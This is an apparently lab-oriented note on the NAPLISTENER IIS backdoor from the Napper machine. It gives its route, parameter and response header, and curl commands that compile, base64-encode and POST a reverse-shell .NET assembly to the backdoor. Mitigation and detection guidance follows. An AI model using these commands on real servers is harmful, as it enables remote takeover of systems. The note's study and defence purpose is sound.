---
topic: NAPLISTENER — IIS backdoor loading .NET assemblies
tags: [windows, iis, naplistener, backdoor, dotnet, napper]
---

# NAPLISTENER — IIS backdoor loading .NET assemblies

[🌐 Español](naplistener-iis-backdoor.md) | **English**

## Concept

NAPLISTENER is an IIS backdoor implemented as an HTTP module or handler and disguised as a legitimate route. It receives a base64 .NET assembly in a POST parameter, decodes it in memory and runs a specific method, usually the constructor of a `Run` class. It needs no `.aspx` or executable written to disk.

On Napper the route was `/ews/MsExgHealthCheckd/`, the parameter `sdafwe3rwe23`, and the response appended `Microsoft-HTTPAPI/2.0` to the `Server` header.

## When it applies

- IIS with a native module or .NET handler added outside the standard site.
- A route returning 404 on GET and 200 on POST with a specific parameter.
- A `Server` header with `Microsoft-HTTPAPI/2.0` on an otherwise unusual response.
- Documentation or source code describing the backdoor contract.

## Procedure

1. Look for anomalous IIS routes (`/ews/`, long names, health checks).
2. Compare `Server` and status codes between GET and POST.
3. Identify the parameter and format (base64 of a .NET PE).
4. Compile a DLL with the expected class and constructor.
5. Send the URL-encoded base64 and catch the connection.

## Commands

```bash
curl -i http://<HOST>/ews/MsExgHealthCheckd/
curl -i -X POST -d 'sdafwe3rwe23=' http://<HOST>/ews/MsExgHealthCheckd/
```

```bash
mcs -target:library -out:rev.dll rev.cs
base64 -w0 rev.dll > rev.b64
curl -X POST --data-urlencode 'sdafwe3rwe23@rev.b64' \
  http://<HOST>/ews/MsExgHealthCheckd/
```

The assembly must expose `namespace rev`, `public class Run` and a `Run()` constructor opening the reverse shell.

## Variants

- The parameter may have another name or arrive as `application/x-www-form-urlencoded`.
- The class may be `Run`, `Program` or a malware-specific name.
- The assembly may be loaded with `Assembly.Load` and invoked via reflection.
- The route may imitate an Exchange endpoint (`/ews/`, `/autodiscover/`).

## Limitations

- Without the exact contract (route, parameter, class), the payload will not run.
- The assembly must match the server's .NET version.
- IIS may log the body or block large requests.
- The backdoor may require authentication or a token.

## Mitigation

- Audit IIS modules and handlers (`appcmd list modules`).
- Compare configuration against a baseline and look for undocumented routes.
- Allowlist extensions and modules; sign assemblies.
- Monitor POSTs to health-check routes carrying base64.
- Reinstall IIS from a clean image if a backdoor is confirmed.

## Detection

- GET 404 and POST 200 on the same route.
- `Server: Microsoft-HTTPAPI/2.0` on an IIS site response.
- Base64 bodies decoding to `MZ` (PE).
- `w3wp.exe` loading assemblies from memory or unexpected child processes.

## References

- [Elastic — IIS malware](https://www.elastic.co/security-labs/iis-malware)
- [MITRE — NAPLISTENER](https://attack.mitre.org/software/S1106/)
- [0xdf — Napper](https://0xdf.gitlab.io/2024/05/04/htb-napper.html)
- [Napper writeup](../../machines/windows/napper/README.en.md)
